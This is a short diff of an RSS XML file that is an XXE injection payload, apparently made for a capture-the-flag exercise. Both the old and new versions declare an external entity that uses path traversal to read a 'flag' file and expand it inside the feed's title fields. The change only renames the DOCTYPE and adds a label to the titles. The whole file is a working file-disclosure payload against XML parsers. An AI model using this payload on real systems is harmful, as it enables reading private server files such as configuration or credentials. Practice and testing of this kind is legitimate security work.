@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 
-<!DOCTYPE XXE [
+<!DOCTYPE rss [
   <!ENTITY test "this is a xxe test">
   <!ENTITY flag SYSTEM "../../../../../../../../../../../../../flag">
 ]>
@@ -8,11 +8,11 @@
 <rss version="2.0">
 
 <channel>
-  <title>&test; &flag;</title>
+  <title>XXE Test &test; &flag;</title>
   <link>https://www.w3schools.com</link>
   <description>A RSS XXE Test</description>
   <item>
-    <title>&test; &flag;</title>
+    <title>XXE Test &test; &flag;</title>
     <link>https://blog.swwind.me</link>
     <description>A flag</description>
   </item>
